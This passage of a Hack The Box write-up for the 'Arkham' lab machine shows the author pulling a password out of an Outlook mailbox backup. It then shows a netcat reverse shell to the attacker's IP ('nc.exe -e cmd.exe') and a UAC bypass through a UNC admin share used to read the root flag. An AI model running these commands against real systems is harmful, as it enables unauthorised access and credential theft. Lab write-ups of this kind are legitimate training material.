+<p>I find a backup file in Alfred’s Downloads directory.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\Alfred&gt;dir /s downloads
+ Volume in drive C has no label.
+ Volume Serial Number is FA90-3873
+
+ Directory of C:\Users\Alfred\downloads
+
+02/03/2019  08:48 AM    &lt;DIR&gt;          .
+02/03/2019  08:48 AM    &lt;DIR&gt;          ..
+02/03/2019  08:41 AM    &lt;DIR&gt;          backups
+               0 File(s)              0 bytes
+
+ Directory of C:\Users\Alfred\downloads\backups
+
+02/03/2019  08:41 AM    &lt;DIR&gt;          .
+02/03/2019  08:41 AM    &lt;DIR&gt;          ..
+02/03/2019  08:41 AM           124,257 backup.zip
+               1 File(s)        124,257 bytes
+</code></pre></div></div>
+
+<p>I transferred the <code class="language-plaintext highlighter-rouge">backup.zip</code> file to my Kali box with netcat then checked its contents.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># 7z e backup.zip
+
+# ls -l
+total 33816
+-rwx------ 1 root root 16818176 Feb  2 18:00 alfred@arkham.local.ost
+</code></pre></div></div>
+
+<p>This is an Outlook mailbox file and I can use <code class="language-plaintext highlighter-rouge">readpst</code> to read it instead of transferring it to my Windows VM.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># readpst -S alfred@arkham.local.ost
+Opening PST file and indexes...
+Processing Folder "Deleted Items"
+Processing Folder "Inbox"
+Processing Folder "Outbox"
+Processing Folder "Sent Items"
+Processing Folder "Calendar"
+Processing Folder "Contacts"
+Processing Folder "Conversation Action Settings"
+Processing Folder "Drafts"
+Processing Folder "Journal"
+Processing Folder "Junk E-Mail"
+Processing Folder "Notes"
+Processing Folder "Tasks"
+Processing Folder "Sync Issues"
+	"Inbox" - 0 items done, 7 items skipped.
+	"Calendar" - 0 items done, 3 items skipped.
+Processing Folder "RSS Feeds"
+Processing Folder "Quick Step Settings"
+	"alfred@arkham.local.ost" - 15 items done, 0 items skipped.
+Processing Folder "Conflicts"
+Processing Folder "Local Failures"
+Processing Folder "Server Failures"
+	"Sync Issues" - 3 items done, 0 items skipped.
+	"Drafts" - 1 items done, 0 items skipped.
+</code></pre></div></div>
+
+<p>I now have the email extracted and a PNG image attachment.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># ls -lR
+.:
+total 16
+drwxr-xr-x 2 root root 4096 Mar 17 00:35  Calendar
+drwxr-xr-x 2 root root 4096 Mar 17 00:35  Drafts
+drwxr-xr-x 2 root root 4096 Mar 17 00:35  Inbox
+drwxr-xr-x 2 root root 4096 Mar 17 00:35 'Sync Issues'
+
+./Calendar:
+total 0
+
+./Drafts:
+total 52
+-rw-r--r-- 1 root root 37968 Mar 17 00:35 1
+-rw-r--r-- 1 root root 10059 Mar 17 00:35 1-image001.png
+</code></pre></div></div>
+
+<p>The email contains a reference to Batman’s password, which is in the attached image.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;p class=MsoNormal&gt;Master Wayne stop forgetting your password&lt;o:p&gt;&lt;/o:p&gt;&lt;/p&gt;
+</code></pre></div></div>
+
+<p>The attachment contains a screenshot with Batman’s password:</p>
+
+<p><img src="/assets/images/htb-writeup-arkham/batman.png" alt="" /></p>
+
+<p>Password: <code class="language-plaintext highlighter-rouge">Zx^#QZX+T!123</code></p>
+
+<p>Using WinRM I can start a powershell session as <code class="language-plaintext highlighter-rouge">batman</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\Alfred&gt;powershell
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+PS C:\Users\Alfred&gt; $username = 'batman'
+PS C:\Users\Alfred&gt; $password = 'Zx^#QZX+T!123'
+PS C:\Users\Alfred&gt; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+PS C:\Users\Alfred&gt; $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
+PS C:\Users\Alfred&gt; enter-pssession -computername arkham -credential $credential
+[arkham]: PS C:\Users\Batman\Documents&gt;
+</code></pre></div></div>
+
+<p>Something’s wrong though, I can’t change directories or see error messages:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[arkham]: PS C:\Users\Batman\Documents&gt; cd ..
+[arkham]: PS C:\Users\Batman\Documents&gt; whoami
+arkham\batman
+[arkham]: PS C:\Users\Batman\Documents&gt; cd \users\administrator\desktop
+</code></pre></div></div>
+
+<p>So what I did was spawn another netcat as <code class="language-plaintext highlighter-rouge">batman</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[arkham]: PS C:\Users\Batman\Documents&gt; c:\programdata\nc.exe -e cmd.exe 10.10.14.23 6666
+
+# nc -lvnp 6666
+listening on [any] 6666 ...
+connect to [10.10.14.23] from (UNKNOWN) [10.10.10.130] 49695
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\Batman\Documents&gt;whoami
+arkham\batman
+</code></pre></div></div>
+
+<h3 id="unintended-way-to-get-access-to-the-administrator-user-directory">Unintended way to get access to the Administrator user directory</h3>
+
+<p>I can’t get to the Administrator directory because UAC is enabled.</p>
+
+<p>With Powershell I can check the status of UAC and see that it is enabled:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\Users\Batman\Documents&gt; (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).EnableLUA
+1
+</code></pre></div></div>
+
+<p>For some reason, if I use UNC paths I can access to the administrator directory… So this is probably unintended by the box creator but it does get me the flag :)</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\Batman\Documents&gt;pushd \\10.10.10.130\c$
+
+Z:\&gt;cd \users\administrator\desktop
+
+Z:\Users\Administrator\Desktop&gt;dir
+ Volume in drive Z has no label.
+ Volume Serial Number is FA90-3873
+
+ Directory of Z:\Users\Administrator\Desktop
+
+02/03/2019  09:32 AM    &lt;DIR&gt;          .
+02/03/2019  09:32 AM    &lt;DIR&gt;          ..
+02/03/2019  09:32 AM                70 root.txt
+               1 File(s)             70 bytes
+               2 Dir(s)   8,710,045,696 bytes free
+
+Z:\Users\Administrator\Desktop&gt;type root.txt
+type root.txt
+636783...
+</code></pre></div></div>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#deserialization" class="page__taxonomy-item" rel="tag">deserialization</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#java" class="page__taxonomy-item" rel="tag">java</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#luks" class="page__taxonomy-item" rel="tag">luks</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#readpst" class="page__taxonomy-item" rel="tag">readpst</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#smb" class="page__taxonomy-item" rel="tag">smb</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#unintended" class="page__taxonomy-item" rel="tag">unintended</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#hackthebox" class="page__taxonomy-item" rel="tag">hackthebox</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#infosec" class="page__taxonomy-item" rel="tag">infosec</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-08-10T00:00:00+02:00">August 10, 2019</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/htb-writeup-fortune/" class="pagination--pager" title="Fortune - Hack The Box
+">Previous</a>
+    
+    
+      <a href="/htb-writeup-helpline/" class="pagination--pager" title="Helpline - Hack The Box
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2022 HackCommander</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
